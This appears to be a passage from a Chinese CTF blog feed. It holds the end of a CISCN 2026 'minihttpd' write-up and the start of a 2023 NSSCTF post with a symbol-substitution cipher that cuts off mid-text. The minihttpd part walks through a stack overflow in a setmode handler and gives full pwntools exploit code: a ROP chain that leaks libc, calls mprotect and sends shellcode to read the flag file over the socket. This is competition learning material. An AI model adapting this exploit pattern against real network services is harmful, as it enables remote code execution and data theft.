src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229142827975.png" alt="image-20251229142827975"></p><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229143100307.png" alt="image-20251229143100307"></p><ul><li><code>echopost()</code>函数如下，其实就是原封不动的返回用户发送的body数据</li></ul><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229143139665.png" alt="image-20251229143139665"></p><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229143233991.png" alt="image-20251229143233991"></p><ul><li>接下来就来看<code>getmodepost</code>，其实就是得到<code>modepost</code>的内容</li></ul><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229145926262.png" alt="image-20251229145926262"></p><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229150007462.png" alt="image-20251229150007462"></p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul><li>而<code>setmodepost</code>这边这个就是<code>body</code>需要传入格式为<code>setmode=aaaaaaa</code>，其实就是post的传参，并且可以将传入的内容（也就是<code>=</code>后面的字符）写入文件。</li><li>成功写入后返回的是<code>200OK</code>的操作</li></ul><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229143508175.png" alt="image-20251229143508175"></p><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229144005183.png" alt="image-20251229144005183"></p><h3 id="调试程序"><a href="#调试程序" class="headerlink" title="调试程序"></a>调试程序</h3><ul><li>接下来就是怎么利用这个栈溢出漏洞的，这必然是需要调试的。那这个httpd怎么进行调试，当然是附加进程调试。调试<code>httpd</code>和平时的程序调试不太一样。这里我选用的一个比较麻烦的方法，就是先在一个终端这边启动这个httdp程序</li></ul><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229150817588.png" alt="image-20251229150817588"></p><ul><li>然后再使用<code>netstat -tulnp</code>查看<code>9999</code>端口对应的进程号</li></ul><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229150858423.png" alt="image-20251229150858423"></p><ul><li>再使用附加进程调试这个程序：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pid = <span class="number">52322</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tiao</span>():</span><br><span class="line">    gdb.attach(pid,gdbscript=gdb_script)</span><br><span class="line">    pause()</span><br></pre></td></tr></table></figure><ul><li>这样我再使用<code>remote()</code>创建一个进程作为客户端，就可以正常调试用作服务端的程序了。调试代码是这样的</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x0000000000402ff3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000402ff1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">libc本地:</span></span><br><span class="line"><span class="string">0x000000000011f357 : pop rdx ; pop r12 ; ret</span></span><br><span class="line"><span class="string">libc远程:</span></span><br><span class="line"><span class="string">0x000000000015fae6 : pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">gdb_script = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b *0x402B5A</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">pid = <span class="number">52322</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tiao</span>():</span><br><span class="line">    gdb.attach(pid,gdbscript=gdb_script)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">context</span>):</span><br><span class="line">    body = <span class="string">b&quot;POST /hello\r\n&quot;</span></span><br><span class="line">    body += <span class="string">b&quot;Content-Length:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(context)).encode()+<span class="string">b&quot;\r\n&quot;</span></span><br><span class="line">    p.sendline(body)</span><br><span class="line">    p.send(context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>(<span class="params">context</span>):</span><br><span class="line">    body = <span class="string">b&quot;POST /echo\r\n&quot;</span></span><br><span class="line">    body += <span class="string">b&quot;Content-Length:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(context)).encode()+<span class="string">b&quot;\r\n&quot;</span></span><br><span class="line">    p.sendline(body)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setmode</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    要求setmode格式, setmode=xxx</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    body = <span class="string">b&quot;POST /setmode\r\n&quot;</span></span><br><span class="line">    body += <span class="string">b&quot;Content-Length:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(context)).encode()+<span class="string">b&quot;\r\n\r\n&quot;</span><span class="comment">#+context</span></span><br><span class="line">    p.send(body)</span><br><span class="line">    pause()</span><br><span class="line">    p.send(context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getmode</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    要求只能输入getmode</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    body = <span class="string">b&quot;POST /getmode\r\n&quot;</span></span><br><span class="line">    body += <span class="string">b&quot;Content-Length:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(context)).encode()+<span class="string">b&quot;\r\n&quot;</span></span><br><span class="line">    p.sendline(body)</span><br><span class="line">    p.send(context)</span><br><span class="line"></span><br><span class="line">tiao()</span><br><span class="line">p = remote(ip,port)</span><br><span class="line">getmode(<span class="string">b&#x27;getmode&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>注意：使用该方法调试的缺点就是程序崩溃一次就要重新启动pid，还需要重新查看和修改<code>pid</code>的值。</p><h3 id="思路与利用点"><a href="#思路与利用点" class="headerlink" title="思路与利用点"></a>思路与利用点</h3><ul><li>我的思路是这样的：<ul><li>使用<code>send</code>泄露<code>libc</code>的地址，将程序跳转到main函数中再执行一次。首次连接的时候<code>fd=4</code>，其他时候连接的<code>fd</code>未知。此时这个<code>fd</code>还在保持着。由于服务端进程没死，libc的地址不变。</li><li>直接再连接一次，通过调试确定第二个客服端连接时在服务端所指示的<code>fd</code>的值。</li><li>调用<code>mprotect</code>，然后写shellcode实现orw。</li><li>但是实际上一开始使用send是能稳定将libc输出出来的，但是不知道是怎么回事，调试到后面就一直泄露不了libc的地址。（然后远程打了也泄露不出来）</li></ul></li><li>赛后问了一下其他师傅（wp截止提交之后）：发现可以利用读<code>mode.txt</code>和写<code>mode.txt</code>将libc给泄露出来。这个到时候之后再看看。</li><li>现在赛后复现按照我的思路又能稳定泄露libc了。这里留个<strong>疑问</strong>，感觉是程序调试太多了，fd指针对应到内核的某个数据不够用了？？？</li></ul><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229153132229.png" alt="image-20251229153132229"></p><ul><li>接下来完成我的思路剩下部分再来探究其他的解法，通过调试发现第二次客户端连接的时候<code>fd=7</code>，那orw的时候<code>fd=7</code></li></ul><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229154201358.png" alt="image-20251229154201358"></p><ul><li>修改后再来调试一次，调试的时候发现shellcode没写进去，通过调试发现<code>rop</code>布置的有点问题。</li></ul><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229154638011.png" alt="image-20251229154638011"></p><ul><li>调试之后发现本地是能成功的，不使用gdb调试正常打也可以出来。现在就剩尝试远程的了。</li></ul><p><img src="/2025/12/29/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2026%E5%B9%B4/ciscn2026%E5%A4%8D%E7%8E%B0/image-20251229155320276.png" alt="image-20251229155320276"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><ul><li>我的思路exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">gdb_script = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b *0x402B5A</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">pid = <span class="number">67510</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tiao</span>():</span><br><span class="line">    gdb.attach(pid,gdbscript=gdb_script)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment">#tiao()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">context</span>):</span><br><span class="line">    body = <span class="string">b&quot;POST /hello\r\n&quot;</span></span><br><span class="line">    body += <span class="string">b&quot;Content-Length:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(context)).encode()+<span class="string">b&quot;\r\n&quot;</span></span><br><span class="line">    p.sendline(body)</span><br><span class="line">    p.send(context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>(<span class="params">context</span>):</span><br><span class="line">    body = <span class="string">b&quot;POST /echo\r\n&quot;</span></span><br><span class="line">    body += <span class="string">b&quot;Content-Length:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(context)).encode()+<span class="string">b&quot;\r\n&quot;</span></span><br><span class="line">    p.sendline(body)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setmode</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    要求setmode格式, setmode=xxx</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    body = <span class="string">b&quot;POST /setmode\r\n&quot;</span></span><br><span class="line">    body += <span class="string">b&quot;Content-Length:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(context)).encode()+<span class="string">b&quot;\r\n\r\n&quot;</span><span class="comment">#+context</span></span><br><span class="line">    p.send(body)</span><br><span class="line">    pause()</span><br><span class="line">    p.send(context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getmode</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    要求只能输入getmode</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    body = <span class="string">b&quot;POST /getmode\r\n&quot;</span></span><br><span class="line">    body += <span class="string">b&quot;Content-Length:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(context)).encode()+<span class="string">b&quot;\r\n&quot;</span></span><br><span class="line">    p.sendline(body)</span><br><span class="line">    p.send(context)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x0000000000402ff3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000402ff1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">libc本地:</span></span><br><span class="line"><span class="string">0x000000000011f357 : pop rdx ; pop r12 ; ret</span></span><br><span class="line"><span class="string">libc远程:</span></span><br><span class="line"><span class="string">0x000000000015fae6 : pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x402ff3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x402ff1</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;setmode=&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x448</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x405F10</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x401414</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(<span class="number">0x402E1E</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">setmode(payload)</span><br><span class="line"></span><br><span class="line">leak = p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]</span><br><span class="line">send_addr = u64(leak.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = send_addr - libc.sym[<span class="string">&#x27;send&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]leak:&#x27;</span>,leak)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]libc_base:&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdx = <span class="number">0x11f357</span> + libc_base</span><br><span class="line">mprotect = libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p = remote(ip,port)</span><br><span class="line">payload = <span class="string">b&#x27;setmode=&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x448</span> + p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x406000</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x1000</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx) </span><br><span class="line">payload += p64(<span class="number">7</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(mprotect)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">7</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x406000</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(read)</span><br><span class="line">payload += p64(<span class="number">0x406000</span>)</span><br><span class="line">setmode(payload)</span><br><span class="line"><span class="comment">#getmode(b&#x27;getmode&#x27;)</span></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="number">0x406100</span>,<span class="number">0x50</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">7</span>,<span class="number">0x406100</span>,<span class="number">0x50</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">pause()</span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1>]]></content>
    
    
    <summary type="html">前言：minihttpd差一点QAQ，狠狠爆0了</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="write-up" scheme="http://iyheart.github.io/categories/CTF/write-up/"/>
    
    
  </entry>
  
  <entry>
    <title>2023NSSCTF2nd-wp</title>
    <link href="http://iyheart.github.io/2025/12/17/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2023%E5%B9%B4/2023NSSCTF2nd-wp/"/>
    <id>http://iyheart.github.io/2025/12/17/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2023%E5%B9%B4/2023NSSCTF2nd-wp/</id>
    <published>2025-12-17T14:16:47.000Z</published>
    <updated>2025-12-22T04:35:50.180Z</updated>
    
    <content type="html"><![CDATA[<h1 id="crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="funnyencrypt未完成"><a href="#FunnyEncrypt-未完成" class="headerlink" title="FunnyEncrypt(未完成)"></a>FunnyEncrypt(未完成)</h2><ul><li><p>偏misc的密码一点都不好玩QAQ。</p></li><li><p>题目附件如下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">✧✡✭</span><br><span class="line">✡✮ ✣✴✯ ✤✶✬✬✱ ✬✤ ✱✦✢✥✮✯✧✧, ✴✬✷✯ ✡✧ ✣✴✯ ✶✡✰✴✣. ✡✣ ❂✢✡✮✰✧ ✩✬✸✤✬✢✣, ✤✦✡✣✴, ✦✮✱ ✩✬✮✤✡✱✯✮✩✯. ✡✣ ✰✡✲✯✧ ✳✧ ✰✳✡✱✦✮✩✯ ★✴✯✮ ★✯ ✦✢✯ ✶✬✧✣, ✦✮✱ ✰✡✲✯✧ ✧✳✷✷✬✢✣ ★✴✯✮ ★✯ ✦✢✯ ✦✤✢✦✡✱. ✦✮✱ ✣✴✯ ✸✬✸✯✮✣ ★✯ ✰✡✲✯ ✳✷ ✴✬✷✯, ★✯ ✰✡✲✯ ✳✷ ✬✳✢ ✶✡✲✯✧. ✣✴✯ ★✬✢✶✱ ★✯ ✶✡✲✯ ✡✮ ✡✧ ✱✡✧✡✮✣✯✰✢✦✣✡✮✰ ✡✮✣✬ ✦ ✷✶✦✩✯ ✬✤ ✸✦✶✡✩✯ ✦✮✱ ✴✦✣✢✯✱, ★✴✯✢✯ ★✯ ✮✯✯✱ ✴✬✷✯ ✦✮✱ ✤✡✮✱ ✡✣ ✴✦✢✱✯✢. ✡✮ ✣✴✡✧ ★✬✢✶✱ ✬✤ ✤✯✦✢, ✴✬✷✯ ✣✬ ✤✡✮✱ ❂✯✣✣✯✢, ❂✳✣ ✯✦✧✡✯✢ ✧✦✡✱ ✣✴✦✮ ✱✬✮✯, ✣✴✯ ✸✬✢✯ ✸✯✦✮✡✮✰✤✳✶ ✶✡✤✯ ✬✤ ✤✦✡✣✴ ★✡✶✶ ✸✦✥✯ ✶✡✤✯ ✸✯✦✮✡✮✰✤✳✶.</span><br><span class="line">✧✬✸✯✣✡✸✯✧ ★✯ ✣✴✡✮✥ ✬✤ ✱✢✯✦✸✧ ✦✧ ✤✦✮✣✦✧✡✯✧ - ✡✣<span class="string">&#x27;✧ ✯✦✧✵ ✣✬ ✱✬ ★✴✯✮ ✵✬✳ ✴✦✲✯ ✸✬✮✯✵, ✢✯✮✣, ✦✮✱ ★✬✢✥. ❂✳✣ ✵✬✳ ✩✦✮&#x27;</span>✣ ✷✢✯✷✦✢✯ ✵✬✳✢✧✯✶✤ ✦✮✱ ✫✳✸✷ ✬✤✤ ✣✴✯ ✩✶✡✤✤: ✵✬✳ ✧✴✬✳✶✱ ✰✢✬★ ✵✬✳✢ ★✡✮✰✧ ✤✡✢✧✣. ✦ ✶✡✣✣✶✯ ❂✡✣ ✣✬★✦✢✱ ✣✴✯ ✱✢✯✦✸. ✧✣✯✷ ❂✵ ✧✣✯✷. ✣✦✥✯ ✦ ✧✣✯✷ ✤✬✢★✦✢✱. ✦✤✣✯✢ ✦✶✶, ✡✣<span class="string">&#x27;✧ ✵✬✳✢ ✸✡✧✧✡✬✮.</span></span><br><span class="line"><span class="string">✥✯✯✷ ✤✦✡✣✴ ✦✮✱ ✴✬✷✯ ✤✬✢ ✣✴✯ ✤✳✣✳✢✯. ✸✦✥✯ ✵✬✳✢ ✸✬✧✣ ✧✡✮✩✯✢✯ ✱✢✯✦✸✧, ✦✮✱ ★✴✯✮ ✣✴✯ ✬✷✷✬✢✣✳✮✡✣✡✯✧ ✩✬✸✯, ✣✴✯✵ ★✡✶✶ ✤✡✰✴✣ ✤✬✢ ✣✴✯✸. ✡✣ ✸✦✵ ✣✦✥✯ ✦ ✧✯✦✧✬✮ ✬✢ ✸✬✢✯, ❂✳✣ ✣✴✯ ✯✮✱✡✮✰ ★✡✶✶ ✮✬✣ ✩✴✦✮✰✯. ✦✸❂✡✣✡✬✮, ❂✯✧✣, ❂✯✩✬✸✯ ✦ ✢✯✦✶✡✣✵. ✦✮ ✳✮✩✯✢✣✦✡✮ ✤✳✣✳✢✯, ✬✮✶✵ ✬✮✯ ✧✣✯✷ ✦✣ ✦ ✣✡✸✯, ✣✴✯ ✴✬✷✯ ✩✦✮ ✢✯✦✶✡✪✯ ✣✴✯ ✱✢✯✦✸ ✬✤ ✣✴✯ ✴✡✰✴✯✧✣. ★✯ ✸✳✧✣ ✣✢✯✦✧✳✢✯ ✣✴✯ ✱✢✯✦✸, ✣✬ ✷✢✬✣✯✩✣ ✡✣ ✦ ✧✯✦✧✬✮, ✶✯✣ ✡✣ ✡✮ ✣✴✯ ✴✯✦✢✣ ❋✳✡✯✣✶✵ ✰✯✢✸✡✮✦✶.</span></span><br><span class="line"><span class="string">✬✮✶✵ ★✴✯✮ ✵✬✳ ✳✮✱✯✢✧✣✦✮✱ ✣✴✯ ✣✢✳✯ ✸✯✦✮✡✮✰ ✬✤ ✶✡✤✯ ✩✦✮ ✵✬✳ ✶✡✲✯ ✣✢✳✶✵. ❂✡✣✣✯✢✧★✯✯✣ ✦✧ ✶✡✤✯ ✡✧, ✡✣&#x27;</span>✧ ✧✣✡✶✶ ★✬✮✱✯✢✤✳✶, ✦✮✱ ✡✣<span class="string">&#x27;✧ ✤✦✧✩✡✮✦✣✡✮✰ ✯✲✯✮ ✡✮ ✣✢✦✰✯✱✵. ✡✤ ✵✬✳&#x27;</span>✢✯ ✫✳✧✣ ✦✶✡✲✯, ✣✢✵ ✴✦✢✱✯✢ ✦✮✱ ✣✢✵ ✣✬ ✶✡✲✯ ★✬✮✱✯✢✤✳✶✶✵.</span><br><span class="line">✡ ❂✯✶✡✯✲✯ ✣✴✯✢✯ ✡✧ ✦ ✷✯✢✧✬✮ ★✴✬ ❂✢✡✮✰✧ ✧✳✮✧✴✡✮✯ ✡✮✣✬ ✵✬✳✢ ✶✡✤✯. ✣✴✦✣ ✷✯✢✧✬✮ ✸✦✵ ✴✦✲✯ ✯✮✬✳✰✴ ✣✬ ✧✷✢✯✦✱ ✦✢✬✳✮✱. ❂✳✣ ✡✤ ✵✬✳ ✢✯✦✶✶✵ ✴✦✲✯ ✣✬ ★✦✡✣ ✤✬✢ 